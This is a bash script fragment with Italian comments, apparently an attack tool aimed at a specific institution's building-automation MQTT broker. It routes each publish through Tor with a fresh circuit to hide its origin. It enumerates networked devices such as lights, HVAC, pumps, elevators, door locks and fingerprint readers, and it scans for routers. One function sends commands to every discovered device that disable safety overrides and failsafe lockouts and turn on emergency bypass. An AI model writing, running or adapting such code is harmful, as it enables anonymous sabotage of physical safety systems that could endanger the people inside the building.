# üåê TOR NEW IP EVERY COMMAND (single port)
rotate_torsocks() {
    echo -n "üîÑ TOR NEW IP... " && echo 'SIGNAL NEWNYM' | nc 127.0.0.1 9051 >/dev/null 2>&1
    sleep 0.5
    torsocks mosquitto_pub -h "$HOST" -p "$PORT" -t "$1" -m "$2" -q 1 >/dev/null 2>&1 2>&1 &
    echo "‚Üí $1 = $2"
    sleep 0.1
}

# üî• TOTAL AUTO-DISCOVERY + CLASSIFICAZIONE INTELLIGENTE (500+ devices)
discover_all_devices() {
    echo "üîç TOTAL AUTO-DISCOVERY + CLASSIFICAZIONE (45s)..."
    
    # Trigger discovery completa
    rotate_torsocks "glp/0/${SID}/fb/dev/lon/discovery" "FULL_SCAN"
    rotate_torsocks "system/lon/nodes" "ENUMERATE_ALL"
    
    # Cattura TUTTI i MAC reali
    echo "üì° Scanning ${HOST}:1883 per devices..."
    mosquitto_sub -h "$HOST" -p "$PORT" -t "glp/0/${SID}/fb/dev/lon/+/if/device/0/nv_#" -v | \
    grep -oE "02[0-9A-F]{10}" | sort -u > ALL_UIowa_DEVICES.txt
    
    mapfile -t ALL_DEVICES < ALL_UIowa_DEVICES.txt
    
    # üî¨ CLASSIFICAZIONE AUTOMATICA reale Echelon
    echo "üî¨ Classificando ${#ALL_DEVICES[@]} devices..."
    > classified_devices.txt
    
    for dev in "${ALL_DEVICES[@]}"; do
        device_type=$(timeout 1 mosquitto_sub -h "$HOST" -p "$PORT" -t "${BASE}${dev}/if/device/0/nv_DeviceType" -C 1 -v 2>/dev/null | grep -oE "[A-Z]+$" || echo "GENERIC")
        
        case "$device_type" in
            *LIGHT*|*LAMP*|*LED*) LIGHTS+=("$dev"); echo "$dev ‚Üí LIGHT" >> classified_devices.txt ;;
            *HVAC*|*AIR*|*FAN*) HVAC+=("$dev"); echo "$dev ‚Üí HVAC" >> classified_devices.txt ;;
            *HEAT*|*HEATER*) HEAT+=("$dev"); echo "$dev ‚Üí HEAT" >> classified_devices.txt ;;
            *PUMP*|*WATER*) PUMPS+=("$dev"); echo "$dev ‚Üí PUMP" >> classified_devices.txt ;;
            *ELEVATOR*|*LIFT*) ELEVATORS+=("$dev"); echo "$dev ‚Üí ELEVATOR" >> classified_devices.txt ;;
            *DOOR*|*LOCK*) FPRSA+=("$dev"); echo "$dev ‚Üí DOOR" >> classified_devices.txt ;;
            *FPR*|*FINGER*) FPRSA+=("$dev"); echo "$dev ‚Üí FPR" >> classified_devices.txt ;;
            *) ALL_DEVICES_generic+=("$dev"); echo "$dev ‚Üí GENERIC" >> classified_devices.txt ;;
        esac
    done
    
    echo "‚úÖ CLASSIFICAZIONE COMPLETA:"
    echo "   üí° Luci: ${#LIGHTS[@]}"
    echo "   üå°Ô∏è HVAC: ${#HVAC[@]}"
    echo "   üõó Elevatori: ${#ELEVATORS[@]}"
    echo "   üíß Pompe: ${#PUMPS[@]}"
    echo "   üîí Porte/FPR: ${#FPRSA[@]}"
    echo "   ‚ö° Generic: ${#ALL_DEVICES_generic[@]}"
    echo "üìÑ Salvati: ALL_UIowa_DEVICES.txt + classified_devices.txt"
}

# üõ°Ô∏è DISABILITA FAILSAFE PERMANENTE
disable_failsafe() {
    echo "üõ°Ô∏è FAILSAFE DISABLED PERMANENTEMENTE (${#ALL_DEVICES[@]} devices)"
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_SafetyOverride" "DISABLED"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FailsafeLockout" "1"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_EmergencyBypass" "ON"
    done
}

# üåê AUTO-DISCOVERY NETWORK (routers/gateways reali)
discover_network() {
    echo "üîç AUTO-DISCOVERY NETWORK (5s scan)..."
    rotate_torsocks "network/discovery/arp" "SCAN_FULL"
    rotate_torsocks "network/discovery/routers" "LIST"
    rotate_torsocks "network/discovery/gateways" "DETECT"
    rotate_torsocks "system/net/neighbors" "SHOW_ALL"
    rotate_torsocks "network/broadcast" "DISCOVER_ROUTERS"
    
    echo "üì° Catturando risposte (Ctrl+C per stop)..."
    mosquitto_sub -h "$HOST" -p "$PORT" -t 'network/discovery/#' -v | \
    grep -E "(128\.255\.220|router|gateway)" | grep -oE "128\.255\.220\.[0-255]+" | \
    sort -u | tee discovered_routers.txt
    echo "‚úÖ Routers salvati in discovered_routers.txt"
}

